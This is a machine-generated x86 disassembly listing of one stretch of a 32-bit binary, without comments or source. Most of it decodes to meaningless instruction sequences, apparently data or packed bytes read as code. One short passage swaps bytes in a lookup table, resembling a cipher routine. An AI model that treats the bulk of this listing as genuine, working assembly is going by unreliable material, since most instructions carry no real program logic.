  40c1a3:	test   al,ah
  40c1a5:	inc    edi
  40c1a6:	fbld   TBYTE PTR [ebx-0x19]
  40c1a9:	test   BYTE PTR [edi],ah
  40c1ab:	push   esi
  40c1ac:	sbb    esi,ebp
  40c1ae:	scas   al,BYTE PTR es:[edi]
  40c1af:	and    BYTE PTR [ecx],ah
  40c1b1:	dec    edi
  40c1b2:	in     al,0xf2
  40c1b4:	inc    edi
  40c1b5:	and    ah,bl
  40c1b7:	mov    dl,0xbe
  40c1b9:	mov    ds:0xc398acd7,al
  40c1be:	or     DWORD PTR [eax-0x43],ecx
  40c1c1:	iret   
  40c1c2:	aam    0xfc
  40c1c4:	pop    edi
  40c1c5:	ss ss hlt 
  40c1c8:	int3   
  40c1c9:	jne    0x40c22f
  40c1cb:	add    eax,0x209bfacd
  40c1d0:	mov    edx,0xf7289093
  40c1d5:	inc    ebp
  40c1d6:	mov    esp,0xa5f87b28
  40c1db:	ins    DWORD PTR es:[edi],dx
  40c1dc:	fs xchg esi,eax
  40c1de:	in     eax,dx
  40c1df:	out    0xbc,al
  40c1e1:	cwde   
  40c1e2:	jl     0x40c224
  40c1e4:	push   ecx
  40c1e5:	mov    dh,0x24
  40c1e7:	pop    ds
  40c1e8:	jp     0x40c225
  40c1ea:	xor    ah,BYTE PTR [eax-0xbef0516]
  40c1f0:	xchg   ebp,eax
  40c1f1:	scas   al,BYTE PTR es:[edi]
  40c1f2:	and    BYTE PTR [ebp-0x6e],bl
  40c1f5:	mov    dh,0x93
  40c1f7:	cwde   
  40c1f8:	imul   ebp,DWORD PTR ds:0x48603606,0xa92f663
  40c202:	int    0x21
  40c204:	xor    edi,DWORD PTR [edi]
  40c206:	movaps xmm3,XMMWORD PTR [ecx+0x3f]
  40c20a:	and    edi,0xca5ad9a
  40c210:	push   esi
  40c211:	pop    edx
  40c212:	inc    ebx
  40c213:	xor    bh,dh
  40c215:	jmp    0xeb8a:0xd75d9614
  40c21c:	mov    WORD PTR [ebx-0x70],es
  40c21f:	ins    DWORD PTR es:[edi],dx
  40c220:	fnsave [ebx-0x44d72ad1]
  40c226:	pushf  
  40c227:	push   0x2eb0a35b
  40c22c:	hlt    
  40c22d:	(bad)  
  40c22e:	lods   eax,DWORD PTR ds:[esi]
  40c22f:	cld    
  40c230:	sar    ebx,0x14
  40c233:	xchg   ebp,eax
  40c234:	xchg   ah,dh
  40c236:	mov    al,ds:0x5ccae66b
  40c23b:	test   DWORD PTR [edi+0x30],eax
  40c23e:	inc    ebp
  40c23f:	fcom   DWORD PTR [ebx+ecx*1-0x2f6f600b]
  40c246:	jo     0x40c2c1
  40c248:	hlt    
  40c249:	cli    
  40c24a:	pop    ss
  40c24b:	and    ch,BYTE PTR [ecx-0x5522465f]
  40c251:	inc    ebp
  40c252:	outs   dx,BYTE PTR ds:[esi]
  40c253:	cmc    
  40c254:	sbb    DWORD PTR [esi],edx
  40c256:	add    eax,ebx
  40c258:	mov    edi,0x4ac2aa3a
  40c25d:	sub    al,0x84
  40c25f:	call   0x6162:0xf801904
  40c266:	in     al,dx
  40c267:	mov    ds:0xf31429f3,eax
  40c26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26d:	stos   BYTE PTR es:[edi],al
  40c26e:	loope  0x40c252
  40c270:	jmp    0xcb70:0xc8a5677f
  40c277:	pop    esi
  40c278:	or     ch,BYTE PTR [edx+0x38]
  40c27b:	in     eax,0xf
  40c27d:	push   eax
  40c27e:	int    0xff
  40c280:	xchg   esi,eax
  40c281:	cmc    
  40c282:	cmp    ecx,DWORD PTR [edx]
  40c284:	jno    0x40c2b5
  40c286:	sbb    ebp,DWORD PTR [eax-0x2aa9b09b]
  40c28c:	adc    al,bl
  40c28e:	pop    eax
  40c28f:	int3   
  40c290:	rcr    BYTE PTR [edx],0x8b
  40c293:	cmp    eax,0x22300306
  40c298:	adc    al,0x84
  40c29a:	adc    DWORD PTR ds:0x3e4865f8,edx
  40c2a0:	push   esi
  40c2a1:	arpl   sp,di
  40c2a3:	test   eax,0x90d5c82d
  40c2a8:	xchg   esi,eax
  40c2a9:	and    eax,DWORD PTR [esi+0x5a]
  40c2ac:	loopne 0x40c2e2
  40c2ae:	adc    al,0xab
  40c2b0:	in     al,dx
  40c2b1:	int    0xf6
  40c2b3:	ins    DWORD PTR es:[edi],dx
  40c2b4:	inc    esi
  40c2b5:	shl    DWORD PTR [ebx],cl
  40c2b7:	inc    esi
  40c2b8:	cld    
  40c2b9:	jae    0x40c2d2
  40c2bb:	add    eax,0x7eb6a0a8
  40c2c0:	std    
  40c2c1:	mov    eax,0x8c04185e
  40c2c6:	jecxz  0x40c281
  40c2c8:	loopne 0x40c24e
  40c2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2cb:	cli    
  40c2cc:	int    0x43
  40c2ce:	jns    0x40c2c0
  40c2d0:	daa    
  40c2d1:	adc    DWORD PTR [eax-0x6bbb6ff7],edx
  40c2d7:	xchg   esp,eax
  40c2d8:	cli    
  40c2d9:	add    ah,bl
  40c2db:	or     DWORD PTR [esi+0x5bd24ce0],edi
  40c2e1:	fistp  WORD PTR [esi-0x777f54d6]
  40c2e7:	outs   dx,BYTE PTR ds:[esi]
  40c2e8:	adc    DWORD PTR [edi],0x40df828a
  40c2ee:	mov    dl,0x7
  40c2f0:	push   edx
  40c2f1:	mov    ds:0x53b7a122,al
  40c2f6:	cmp    bl,BYTE PTR [ebp+0x6a8eae3b]
  40c2fc:	and    al,0x8c
  40c2fe:	cs and bl,BYTE PTR fs:[edi-0x1324899e]
  40c306:	jnp    0x40c2f3
  40c308:	popa   
  40c309:	(bad)  
  40c30a:	loope  0x40c32d
  40c30c:	mov    ebp,0xc1501732
  40c311:	icebp  
  40c312:	push   ebx
  40c313:	in     eax,0xd8
  40c315:	xor    ebp,DWORD PTR [ebx+edx*4+0x62]
  40c319:	inc    eax
  40c31a:	ins    DWORD PTR es:[edi],dx
  40c31b:	lahf   
  40c31c:	mov    WORD PTR [edx-0x2868074b],gs
  40c322:	xchg   esp,eax
  40c323:	xchg   ecx,eax
  40c324:	fsubp  st(7),st
  40c326:	inc    ebp
  40c327:	and    al,0x6f
  40c329:	dec    edx
  40c32a:	jnp    0x40c3a5
  40c32c:	and    al,0x5
  40c32e:	pop    edi
  40c32f:	cdq    
  40c330:	sbb    BYTE PTR [edx-0x7c1a0144],bl
  40c336:	scas   al,BYTE PTR es:[edi]
  40c337:	mov    dl,dh
  40c339:	mov    esi,0x600f0bda
  40c33e:	cld    
  40c33f:	and    DWORD PTR [edx-0x5d],ebp
  40c342:	xchg   edx,eax
  40c343:	cdq    
  40c344:	pop    eax
  40c345:	xor    esp,esp
  40c347:	aas    
  40c348:	mov    esi,0x8a32ddfc
  40c34d:	xchg   ebp,eax
  40c34e:	mov    al,ds:0x8f29d9e2
  40c353:	mov    dl,0x3f
  40c355:	(bad)  
  40c356:	pop    ds
  40c357:	pop    edx
  40c358:	mov    ch,0x2d
  40c35a:	xchg   ebp,eax
  40c35b:	jp     0x40c311
  40c35d:	icebp  
  40c35e:	xor    ch,BYTE PTR [ebx]
  40c360:	call   0x1c8f7e5d
  40c365:	daa    
  40c366:	push   esp
  40c367:	jg     0x40c3e4
  40c369:	jg     0x40c3c2
  40c36b:	jno    0x40c301
  40c36d:	mov    dh,0xb4
  40c36f:	adc    DWORD PTR [edi+0x52309f4f],ebp
  40c375:	pop    ss
  40c376:	test   ah,al
  40c378:	xor    ebp,ecx
  40c37a:	xor    eax,0xce8cf889
  40c37f:	cmp    ebp,edx
  40c381:	lahf   
  40c382:	mov    DWORD PTR [esi],ecx
  40c384:	sub    DWORD PTR [edi+0x57],edi
  40c387:	(bad)  [edx-0x548c85f0]
  40c38d:	rcl    DWORD PTR [ebx],cl
  40c38f:	inc    edx
  40c390:	push   ecx
  40c391:	jne    0x40c3ea
  40c393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c394:	mov    edx,0x7a913b9a
  40c399:	sub    ah,BYTE PTR [edi-0x75]
  40c39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c39d:	not    DWORD PTR [ecx+0x6c3101c]
  40c3a3:	mov    esp,0xfdd32177
  40c3a8:	xchg   edx,eax
  40c3a9:	mov    WORD PTR [ebx-0x5d],ss
  40c3ac:	jecxz  0x40c37b
  40c3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3af:	push   eax
  40c3b0:	inc    esi
  40c3b1:	pushf  
  40c3b2:	(bad)  
  40c3b3:	pop    ecx
  40c3b4:	mov    ecx,0x2013956a
  40c3b9:	xor    al,cl
  40c3bb:	ja     0x40c428
  40c3bd:	push   edx
  40c3be:	cli    
  40c3bf:	xchg   ecx,eax
  40c3c0:	push   edx
  40c3c1:	loope  0x40c373
  40c3c3:	retf   0x2ef4
  40c3c6:	xchg   ecx,edi
  40c3c8:	xchg   ecx,eax
  40c3c9:	xchg   ah,ch
  40c3cb:	outs   dx,DWORD PTR ds:[esi]
  40c3cc:	push   edx
  40c3cd:	adc    BYTE PTR [edx+0x3ba9c426],ah
  40c3d3:	pop    eax
  40c3d4:	gs pop esi
  40c3d6:	mov    bl,0x63
  40c3d8:	add    al,0xf9
  40c3da:	sub    al,0xbf
  40c3dc:	mov    esp,DWORD PTR [eax-0x23]
  40c3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e0:	sti    
  40c3e1:	push   0xb6c31f67
  40c3e6:	dec    ecx
  40c3e7:	push   edx
  40c3e8:	push   0x8
  40c3ea:	xlat   BYTE PTR ds:[ebx]
  40c3eb:	adc    edi,DWORD PTR [edi]
  40c3ed:	jecxz  0x40c3c1
  40c3ef:	dec    edi
  40c3f0:	mov    DWORD PTR [eax+0x63],edx
  40c3f3:	repnz and DWORD PTR [eax+0x2d],edx
  40c3f7:	mov    dl,0x92
  40c3f9:	pop    ss
  40c3fa:	pop    ds
  40c3fb:	push   ebx
  40c3fc:	push   ecx
  40c3fd:	ret    
  40c3fe:	adc    ah,BYTE PTR [ebp-0x10]
  40c401:	and    BYTE PTR [edi+0x28cd52fa],al
  40c407:	cdq    
  40c408:	shl    BYTE PTR [edx-0x4ceeb20],0xbd
  40c40f:	jo     0x40c40f
  40c411:	jmp    0x11b1:0x7accd417
  40c418:	stos   BYTE PTR es:[edi],al
  40c419:	inc    eax
  40c41a:	inc    ax
  40c41c:	inc    ebp
  40c41d:	xor    bh,bh
  40c41f:	aad    0x4
  40c421:	retf   0x8176
  40c424:	mov    al,0xbb
  40c426:	jno    0x40c3ed
  40c428:	and    bl,BYTE PTR ds:[edi]
  40c42b:	(bad)  
  40c42c:	scas   al,BYTE PTR es:[edi]
  40c42d:	retf   0x9023
  40c430:	in     al,dx
  40c431:	add    eax,0xa4c9276c
  40c436:	ins    BYTE PTR es:[edi],dx
  40c437:	sahf   
  40c438:	cli    
  40c439:	fstp   QWORD PTR [ecx]
  40c43b:	or     edx,DWORD PTR [ebp*8-0x1fd6ef64]
  40c442:	dec    ebp
  40c443:	mov    eax,0x45679afd
  40c448:	dec    ecx
  40c449:	nop
  40c44a:	push   es
  40c44b:	lods   al,BYTE PTR ds:[esi]
  40c44c:	jmp    0x705c:0xce10ec36
  40c453:	fsub   QWORD PTR [eax+0x626489d6]
  40c459:	dec    ecx
  40c45a:	and    DWORD PTR [edx-0x3f],esi
  40c45d:	jg     0x40c4d4
  40c45f:	jno    0x40c42b
  40c461:	cmp    al,0x0
  40c463:	jbe    0x40c435
  40c465:	clc    
  40c466:	je     0x40c4c2
  40c468:	push   esp
  40c469:	pop    ebp
  40c46a:	stos   DWORD PTR es:[edi],eax
  40c46b:	mov    ebp,0x51fc3e79
  40c470:	(bad)  
  40c471:	lea    esi,ds:0x2daca9d4
  40c477:	out    dx,eax
  40c478:	ins    BYTE PTR es:[edi],dx
  40c479:	mov    ebp,0xadea29d5
  40c47e:	test   eax,0x8bbcdbcf
  40c483:	hlt    
  40c484:	int    0x64
  40c486:	dec    eax
  40c487:	push   ecx
  40c488:	sub    BYTE PTR ds:0x83424b3f,al
  40c48e:	adc    DWORD PTR [edx],ebp
  40c490:	jne    0x40c508
  40c492:	imul   edi,DWORD PTR [ecx+0x4e],0xfe4e03cf
  40c499:	test   esp,ebx
  40c49b:	mov    ch,0xfd
  40c49d:	pop    ds
  40c49e:	mov    esp,0x2960d8eb
  40c4a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4a4:	test   ebp,0x442c183e
  40c4aa:	ficom  WORD PTR [edi+eiz*8-0x1da8f7b]
  40c4b1:	gs mov bh,ch
  40c4b4:	test   BYTE PTR [edi+0x7f],al
  40c4b7:	data16 (bad) 
  40c4ba:	mov    al,0xbc
  40c4bc:	xor    eax,0x9d24efbb
  40c4c1:	lds    edx,FWORD PTR [ecx-0x1e7c5a4a]
  40c4c7:	call   0xa10a:0x5cc034f5
  40c4ce:	stos   BYTE PTR es:[edi],al
  40c4cf:	icebp  
  40c4d0:	xchg   ebp,eax
  40c4d1:	(bad)
  40c4d5:	sbb    eax,DWORD PTR [ecx+0x4d354b7a]
  40c4db:	fidivr DWORD PTR ds:0xa70a736b
  40c4e1:	call   0xc3c90efb
  40c4e6:	dec    ah
  40c4e8:	pusha  
  40c4e9:	mov    DWORD PTR [edx-0xb],edi
  40c4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ed:	mov    edi,0xd03344ff
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    ds:0x4d541b63,eax
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c53c
  40c54d:	std    
  40c54e:	mov    esi,0x8f49d394
  40c553:	pusha  
  40c554:	maxps  xmm6,xmm2
  40c557:	xor    DWORD PTR [esi+0x402a2031],edx
  40c55d:	nop
  40c55e:	mov    bl,0xb2
  40c560:	sbb    DWORD PTR ds:0x66886283,0x3e78aa7b
  40c56a:	ret    
  40c56b:	lock jmp 0x4523:0xea84aef0
  40c573:	fidiv  WORD PTR [ecx]
  40c575:	fcmovnbe st,st(3)
  40c577:	loope  0x40c541
  40c579:	arpl   WORD PTR [ecx-0x5c],si
  40c57c:	sub    al,0x1a
  40c57e:	stos   DWORD PTR es:[edi],eax
  40c57f:	and    ebp,DWORD PTR [eax+0x69]
  40c582:	mov    esi,0x55e85bfd
  40c587:	(bad)  [ebx-0x33]
  40c58a:	int    0x59
  40c58c:	cmp    al,0xdd
  40c58e:	and    al,0xcd
  40c590:	in     al,dx
  40c591:	es call 0x1c28:0x6e31f0b6
  40c599:	repnz dec BYTE PTR ds:0x22bc395c
  40c5a0:	clc    
  40c5a1:	adc    BYTE PTR [esi-0x1ad874ce],dh
  40c5a7:	sub    DWORD PTR [esi+0x5c210395],0xa65830cc
  40c5b1:	adc    edx,DWORD PTR [esp+ebx*2-0x26]
  40c5b5:	icebp  
  40c5b6:	mov    edi,0xf6322392
  40c5bb:	xchg   esi,eax
  40c5bc:	sti    
  40c5bd:	fsub   st(7),st
  40c5bf:	xchg   esi,eax
  40c5c0:	push   cs
  40c5c1:	mov    eax,ds:0x5740b751
  40c5c6:	pop    esi
  40c5c7:	jge    0x40c5f9
  40c5c9:	js     0x40c583
  40c5cb:	leave  
  40c5cc:	(bad)  
  40c5cd:	cmc    
  40c5ce:	in     eax,dx
  40c5cf:	mov    fs,WORD PTR [ebp-0x60]
  40c5d2:	or     al,0xe7
  40c5d4:	jg     0x40c606
  40c5d6:	(bad)  
  40c5d7:	lods   eax,DWORD PTR ds:[esi]
  40c5d8:	inc    ebx
  40c5d9:	lods   eax,DWORD PTR ds:[esi]
  40c5da:	js     0x40c5f9
  40c5dc:	push   0x6ed0a22c
  40c5e1:	adc    ah,dh
  40c5e3:	jmp    0x40c5c2
  40c5e5:	out    0x50,al
  40c5e7:	sbb    dl,dl
  40c5e9:	call   0xe5ce1e1a
  40c5ee:	fld    TBYTE PTR [edi]
  40c5f0:	xlat   BYTE PTR ds:[ebx]
  40c5f1:	imul   esp,DWORD PTR [edx],0xa65725ec
  40c5f7:	aaa    
  40c5f8:	push   cs
  40c5f9:	inc    eax
  40c5fa:	bound  eax,QWORD PTR [edx-0x45]
  40c5fd:	jo     0x40c596
  40c5ff:	push   esi
  40c600:	add    BYTE PTR [esp+eiz*4],dh
  40c603:	inc    ebx
  40c604:	fmul   st(7),st
  40c606:	(bad)  
  40c607:	fidivr WORD PTR [ebx+0x168345ce]
  40c60d:	dec    edx
  40c60e:	add    bh,BYTE PTR [ebp+0x319e5163]
  40c614:	scas   eax,DWORD PTR es:[edi]
  40c615:	push   0xffffffb6
  40c617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c618:	jp     0x40c61a
  40c61a:	gs fs stos BYTE PTR es:[edi],al
  40c61d:	or     DWORD PTR [edi],eax
  40c61f:	push   esp
  40c620:	add    DWORD PTR [ebx],esi
  40c622:	sbb    al,0xd9
  40c624:	mov    cl,0xf
  40c626:	loop   0x40c5f9
  40c628:	dec    esi
  40c629:	js     0x40c652
  40c62b:	mov    ds:0x6a26517e,eax
  40c630:	stc    
  40c631:	bound  ebp,QWORD PTR [edi+edx*8+0x2320ab8b]
  40c638:	sbb    DWORD PTR [ebp+ebp*1-0x3fbebda2],ebp
  40c63f:	sbb    dl,0xb5
  40c642:	pop    esi
  40c643:	pop    ebx
  40c644:	loope  0x40c5db
  40c646:	mov    ebp,0xfd585f6a
  40c64b:	and    al,0x11
  40c64d:	xchg   esi,eax
  40c64e:	sbb    ebx,DWORD PTR [ecx]
  40c650:	mov    BYTE PTR [ebp-0xe932878],dl
  40c656:	xchg   edi,eax
  40c657:	js     0x40c5f1
  40c659:	popf   
  40c65a:	in     al,0x34
  40c65c:	sub    edi,edx
  40c65e:	pop    ss
  40c65f:	lock dec esi
  40c661:	and    eax,0xe55cdb10
  40c666:	or     al,BYTE PTR [ebx+0x3e]
  40c669:	xchg   ecx,eax
  40c66a:	mov    esp,ecx
  40c66c:	cmp    DWORD PTR [ebx+0x43b4e1f9],0x841575e
  40c676:	mov    ch,0xed
  40c678:	jb     0x40c6bc
  40c67a:	sbb    ecx,DWORD PTR [esi-0x2270f57]
  40c680:	ins    BYTE PTR es:[edi],dx
  40c681:	out    dx,al
  40c682:	mov    BYTE PTR [edi],dl
  40c684:	push   esp
  40c685:	int3   
  40c686:	retf   
  40c687:	ss jle 0x40c703
  40c68a:	push   cs
  40c68b:	lods   al,BYTE PTR ds:[esi]
  40c68c:	fnsave [esi+0x39]
  40c68f:	mov    cl,0x7c
  40c691:	pusha  
  40c692:	push   eax
  40c693:	mov    ebp,0x1366414f
  40c698:	scas   al,BYTE PTR es:[edi]
  40c699:	int    0x22
  40c69b:	cld    
  40c69c:	cmp    cl,cl
  40c69e:	cld    
  40c69f:	pop    es
  40c6a0:	adc    esp,DWORD PTR [edi-0x2306c5c]
  40c6a6:	nop
  40c6a7:	cmp    esi,DWORD PTR [edx-0x43]
  40c6aa:	scas   eax,DWORD PTR es:[edi]
  40c6ab:	and    esi,DWORD PTR [ebx+0x67fb29af]
  40c6b1:	jne    0x40c64e
  40c6b3:	sbb    bh,dl
  40c6b5:	lods   eax,DWORD PTR ds:[esi]
  40c6b6:	dec    esi
  40c6b7:	ins    DWORD PTR es:[edi],dx
  40c6b8:	jp     0x40c655
  40c6ba:	pusha  
  40c6bb:	test   DWORD PTR [eax-0x25],edx
  40c6be:	dec    edx
  40c6bf:	lods   al,BYTE PTR ds:[esi]
  40c6c0:	enter  0x6598,0x7c
  40c6c4:	mov    ah,0x3a
  40c6c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c7:	inc    edi
  40c6c8:	xor    ch,ch
  40c6ca:	add    BYTE PTR [ebp-0x47],cl
  40c6cd:	nop
  40c6ce:	cmp    BYTE PTR [esi],bh
  40c6d0:	mov    DWORD PTR [eax+esi*1],ecx
  40c6d3:	iret   
  40c6d4:	(bad)  
  40c6d5:	jmp    0x40c6d9
  40c6d7:	pop    ebp
  40c6d8:	int3   
  40c6d9:	pop    edi
  40c6da:	adc    esp,DWORD PTR [ebx+0x21]
  40c6dd:	ror    BYTE PTR [ecx],1
  40c6df:	add    BYTE PTR [ecx],ah
  40c6e1:	dec    ecx
  40c6e2:	in     al,dx
  40c6e3:	or     DWORD PTR [ebx+0x7985f5d5],ebp
  40c6e9:	inc    ebp
  40c6ea:	cmc    
  40c6eb:	imul   ebx,DWORD PTR [ebx+ebp*2],0xe
  40c6ef:	lahf   
  40c6f0:	leave  
  40c6f1:	outs   dx,BYTE PTR ds:[esi]
  40c6f2:	fisttp DWORD PTR [edx-0x59]
  40c6f5:	jb     0x40c6ea
  40c6f7:	or     ebp,DWORD PTR [esi+0x454dafe1]
  40c6fd:	dec    edx
  40c6fe:	sub    ecx,DWORD PTR [eax+0x325b538a]
  40c704:	jle    0x40c69c
  40c706:	stos   BYTE PTR es:[edi],al
  40c707:	ins    DWORD PTR es:[edi],dx
  40c708:	push   ss
  40c709:	jnp    0x40c77b
  40c70b:	push   esi
  40c70c:	xchg   ebx,eax
  40c70d:	ficomp WORD PTR [ecx+eiz*2+0x14]
  40c711:	loop   0x40c697
  40c713:	and    edx,DWORD PTR [edi+ebp*2+0x35]
  40c717:	test   dh,0x6e
  40c71a:	mov    ch,0x4f
  40c71c:	out    dx,eax
  40c71d:	mov    edx,0x9a5a4832
  40c722:	es xchg ebx,eax
  40c724:	jl     0x40c6eb
  40c726:	xor    DWORD PTR [ecx+0x23ef9a83],edi
  40c72c:	jge    0x40c72d
  40c72e:	rcr    edx,0x1b
  40c731:	push   es
  40c732:	ret    0x791d
  40c735:	jmp    0x2cf7dc75
  40c73a:	xor    al,0x82
  40c73c:	push   esi
  40c73d:	(bad)  
  40c73e:	xchg   ebx,eax
  40c73f:	cmp    ebp,edi
  40c741:	jns    0x40c773
  40c743:	inc    ebp
  40c744:	(bad)  
  40c745:	pop    esi
  40c746:	sahf   
  40c747:	scas   eax,DWORD PTR es:[edi]
  40c748:	mov    al,ds:0xf2a1d299
  40c74d:	add    al,0x10
  40c74f:	(bad)  
  40c750:	or     edi,DWORD PTR [ebx+ebx*2+0x14]
  40c754:	jecxz  0x40c6e8
  40c756:	push   ebx
  40c757:	and    ebp,esi
  40c759:	sub    bl,al
  40c75b:	xchg   edx,eax
  40c75c:	adc    dh,BYTE PTR [ecx-0x64589670]
  40c762:	inc    esi
  40c763:	pop    esi
  40c764:	adc    DWORD PTR [edx+0x2c],edx
  40c767:	jg     0x40c70b
  40c769:	or     ebx,DWORD PTR [esi-0x10e810de]
  40c76f:	fisttp WORD PTR [ecx-0x29ef7f6a]
  40c775:	out    0xe2,al
  40c777:	sbb    eax,0x961c3e72
  40c77c:	jne    0x40c76a
  40c77e:	pop    ebx
  40c77f:	xlat   BYTE PTR ds:[ebx]
  40c780:	adc    ah,dl
  40c782:	sbb    BYTE PTR [ebx-0x73],0xb3
  40c786:	dec    edi
  40c787:	jl     0x40c71b
  40c789:	adc    al,0xc1
  40c78b:	mov    esi,0xe649436d
  40c790:	sub    eax,0xc691b8b2
  40c795:	jmp    0x1ecc:0xf5016141
  40c79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c79d:	sahf   
  40c79e:	push   edx
  40c79f:	aas    
  40c7a0:	or     eax,0x2997f705
  40c7a5:	fsub   st,st(6)
  40c7a7:	jmp    0xb6749bfd
  40c7ac:	xor    DWORD PTR [edi*1-0x76189f3c],esi
  40c7b3:	nop
  40c7b4:	jb     0x40c7d2
  40c7b6:	pop    ebp
  40c7b7:	mov    cs,WORD PTR [edx+esi*1-0x48]
  40c7bb:	cmp    eax,0x8322c69a
  40c7c0:	mov    ebx,0xea57f0fa
  40c7c5:	ins    BYTE PTR es:[edi],dx
  40c7c6:	sbb    eax,0xe1b154bf
  40c7cb:	mov    ebp,0x4f977f33
  40c7d0:	xchg   BYTE PTR [ecx+0x5244ba70],bh
  40c7d6:	and    DWORD PTR [ebx-0x43],esi
  40c7d9:	pop    es
  40c7da:	(bad)  
  40c7dc:	push   esi
  40c7dd:	jae    0x40c7e4
  40c7df:	mov    edx,DWORD PTR [ecx]
  40c7e1:	je     0x40c84b
  40c7e3:	stc    
  40c7e4:	cmc    
  40c7e5:	in     al,dx
  40c7e6:	stos   BYTE PTR es:[edi],al
  40c7e7:	xchg   esp,eax
  40c7e8:	adc    ah,BYTE PTR [ebp-0x518da288]
  40c7ee:	mov    bh,0xcc
  40c7f0:	sub    dh,BYTE PTR ds:0xc39f8746
  40c7f6:	pop    edx
  40c7f7:	push   0x694a881e
  40c7fc:	(bad)  
  40c7fe:	scas   eax,DWORD PTR es:[di]
  40c800:	cmc    
  40c801:	mov    eax,0x534a12e9
  40c806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c807:	mov    cl,0xb8
  40c809:	inc    edi
  40c80a:	push   ecx
  40c80b:	mov    bl,0x59
  40c80d:	mov    bl,0x8c
  40c80f:	lds    esp,FWORD PTR [ebx+0x75]
  40c812:	jle    0x40c88b
  40c814:	ins    BYTE PTR es:[edi],dx
  40c815:	mov    WORD PTR [ebp+0x4d5d4ed9],fs
  40c81b:	sub    al,0x9
  40c81d:	or     esp,ecx
  40c81f:	pop    ds
  40c820:	imul   DWORD PTR ds:0xe55edd9a
  40c826:	fdiv   DWORD PTR [ecx]
  40c828:	mov    dl,0xd1
  40c82a:	in     al,dx
  40c82b:	push   es
  40c82c:	pop    esi
  40c82d:	repz shl bl,cl
  40c830:	cmc    
  40c831:	adc    al,0xd9
  40c833:	outs   dx,BYTE PTR ds:[esi]
  40c834:	cmp    ah,BYTE PTR [edx-0x31]
  40c837:	les    edx,FWORD PTR [ebx+0x37]
  40c83a:	dec    BYTE PTR [edx]
  40c83c:	or     al,0x5d
  40c83e:	push   0x77
  40c840:	lahf   
  40c841:	cmp    DWORD PTR [eax],eax
  40c843:	lods   eax,DWORD PTR ds:[esi]
  40c844:	mov    esi,0xc840ce9e
  40c849:	stc    
  40c84a:	pop    ds
  40c84b:	test   eax,0x90b08256
  40c850:	fs push ebx
  40c852:	mul    bh
  40c854:	pop    ecx
  40c855:	dec    BYTE PTR [ebx+0xb]
  40c858:	stos   BYTE PTR es:[edi],al
  40c859:	pusha  
  40c85a:	push   eax
  40c85b:	call   0xb8c0d7bd
  40c860:	dec    esi
  40c861:	imul   ebx,DWORD PTR [edx+esi*2-0x6c],0x4f
  40c866:	and    esi,DWORD PTR [esi-0x10d15512]
  40c86c:	mov    dl,0xac
  40c86e:	adc    dh,BYTE PTR [ebx]
  40c870:	dec    esp
  40c871:	fldenv [eax]
  40c873:	icebp  
  40c874:	fs adc al,0xd4
  40c877:	out    0xb3,al
  40c879:	dec    ebp
  40c87a:	mov    esp,0xbc59765
  40c87f:	out    0xd5,al
  40c881:	loopne 0x40c806
  40c883:	data16 fcomp QWORD PTR [ebp+eax*2+0x7024dca4]
  40c88b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c88c:	rol    edi,1
  40c88e:	xchg   BYTE PTR [eax+edx*2-0x33],ah
  40c892:	jns    0x40c878
  40c894:	sub    cl,BYTE PTR [esi+0x2f386d51]
  40c89a:	popa   
  40c89b:	pop    es
  40c89c:	add    dl,BYTE PTR [edi-0x16404ea6]
  40c8a2:	adc    BYTE PTR [ecx-0x24174380],al
  40c8a8:	pop    ss
  40c8a9:	je     0x40c872
  40c8ab:	lods   al,BYTE PTR ds:[si]
  40c8ad:	sbb    BYTE PTR [ecx],al
  40c8af:	pop    ebp
  40c8b0:	ins    DWORD PTR es:[edi],dx
  40c8b1:	fist   WORD PTR [esi]
  40c8b3:	jecxz  0x40c92d
  40c8b5:	jbe    0x40c8a6
  40c8b7:	(bad)  
  40c8b9:	adc    DWORD PTR [edi+ecx*2],0x3
  40c8bd:	aam    0xd7
  40c8bf:	push   es
  40c8c0:	out    dx,al
  40c8c1:	rol    DWORD PTR [esp+edi*1],0xdf
  40c8c5:	sub    al,BYTE PTR gs:[ecx+0x68]
  40c8c9:	mov    DWORD PTR [esi],esi
  40c8cb:	mov    eax,0x373a51a
  40c8d0:	stos   DWORD PTR es:[edi],eax
  40c8d1:	jmp    0x7215b4eb
  40c8d6:	mov    al,0x76
  40c8d8:	jl     0x40c8ac
  40c8da:	test   al,0x82
  40c8dc:	push   eax
  40c8dd:	dec    edi
